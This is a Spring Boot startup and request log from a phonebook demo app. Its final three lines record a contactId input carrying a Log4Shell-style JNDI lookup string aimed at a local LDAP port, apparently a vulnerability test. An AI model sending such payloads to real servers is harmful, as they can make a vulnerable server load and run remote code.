2021-12-17 12:22:51,465 INFO org.springframework.boot.StartupInfoLogger [main] Starting PhonebookApplication using Java 16.0.2 on LAPTOP-5LBDJOHP with PID 65820 (D:\Cource\RealTimeProject_ClassNotes\Mini_Project1\phonebook\phonebook\target\classes started by aleem in D:\Cource\RealTimeProject_ClassNotes\Mini_Project1\phonebook\phonebook)
2021-12-17 12:22:51,468 INFO org.springframework.boot.SpringApplication [main] No active profile set, falling back to default profiles: default
2021-12-17 12:22:51,982 INFO org.springframework.data.repository.config.RepositoryConfigurationDelegate [main] Bootstrapping Spring Data JPA repositories in DEFAULT mode.
2021-12-17 12:22:52,023 INFO org.springframework.data.repository.config.RepositoryConfigurationDelegate [main] Finished Spring Data repository scanning in 34 ms. Found 1 JPA repository interfaces.
2021-12-17 12:22:52,496 INFO org.springframework.boot.web.embedded.tomcat.TomcatWebServer [main] Tomcat initialized with port(s): 8080 (http)
2021-12-17 12:22:52,505 INFO org.apache.juli.logging.DirectJDKLog [main] Initializing ProtocolHandler ["http-nio-8080"]
2021-12-17 12:22:52,505 INFO org.apache.juli.logging.DirectJDKLog [main] Starting service [Tomcat]
2021-12-17 12:22:52,505 INFO org.apache.juli.logging.DirectJDKLog [main] Starting Servlet engine: [Apache Tomcat/9.0.55]
2021-12-17 12:22:52,594 INFO org.apache.juli.logging.DirectJDKLog [main] Initializing Spring embedded WebApplicationContext
2021-12-17 12:22:52,594 INFO org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext [main] Root WebApplicationContext: initialization completed in 1090 ms
2021-12-17 12:22:52,627 INFO com.zaxxer.hikari.HikariDataSource [main] HikariPool-1 - Starting...
2021-12-17 12:22:52,778 INFO com.zaxxer.hikari.HikariDataSource [main] HikariPool-1 - Start completed.
2021-12-17 12:22:52,788 INFO org.springframework.boot.autoconfigure.h2.H2ConsoleAutoConfiguration [main] H2 console available at '/h2-console'. Database available at 'jdbc:h2:mem:testdb'
2021-12-17 12:22:52,955 INFO org.hibernate.jpa.internal.util.LogHelper [main] HHH000204: Processing PersistenceUnitInfo [name: default]
2021-12-17 12:22:52,988 INFO org.hibernate.Version [main] HHH000412: Hibernate ORM core version 5.6.1.Final
2021-12-17 12:22:53,108 INFO org.hibernate.annotations.common.reflection.java.JavaReflectionManager [main] HCANN000001: Hibernate Commons Annotations {5.1.2.Final}
2021-12-17 12:22:53,192 INFO org.hibernate.dialect.Dialect [main] HHH000400: Using dialect: org.hibernate.dialect.H2Dialect
2021-12-17 12:22:53,608 INFO org.hibernate.engine.transaction.jta.platform.internal.JtaPlatformInitiator [main] HHH000490: Using JtaPlatform implementation: [org.hibernate.engine.transaction.jta.platform.internal.NoJtaPlatform]
2021-12-17 12:22:53,614 INFO org.springframework.orm.jpa.AbstractEntityManagerFactoryBean [main] Initialized JPA EntityManagerFactory for persistence unit 'default'
2021-12-17 12:22:53,859 WARN org.springframework.boot.autoconfigure.orm.jpa.JpaBaseConfiguration$JpaWebConfiguration [main] spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
2021-12-17 12:22:54,115 INFO org.apache.juli.logging.DirectJDKLog [main] Starting ProtocolHandler ["http-nio-8080"]
2021-12-17 12:22:54,156 INFO org.springframework.boot.web.embedded.tomcat.TomcatWebServer [main] Tomcat started on port(s): 8080 (http) with context path ''
2021-12-17 12:22:54,164 INFO org.springframework.boot.StartupInfoLogger [main] Started PhonebookApplication in 3.088 seconds (JVM running for 3.428)
2021-12-17 12:30:07,945 INFO org.apache.juli.logging.DirectJDKLog [http-nio-8080-exec-1] Initializing Spring DispatcherServlet 'dispatcherServlet'
2021-12-17 12:30:07,945 INFO org.springframework.web.servlet.FrameworkServlet [http-nio-8080-exec-1] Initializing Servlet 'dispatcherServlet'
2021-12-17 12:30:07,947 INFO org.springframework.web.servlet.FrameworkServlet [http-nio-8080-exec-1] Completed initialization in 1 ms
2021-12-17 12:30:07,974 INFO com.a2stech.phonebook.controller.ContactController [http-nio-8080-exec-1] Edit contactId input:${jndi:ldap://127.0.0.1:3089/}
2021-12-17 12:30:07,974 WARN com.a2stech.phonebook.controller.ContactController [http-nio-8080-exec-1] Edit contactId input:${jndi:ldap://127.0.0.1:3089/}
2021-12-17 12:30:07,974 ERROR com.a2stech.phonebook.controller.ContactController [http-nio-8080-exec-1] Edit contactId input:${jndi:ldap://127.0.0.1:3089/}
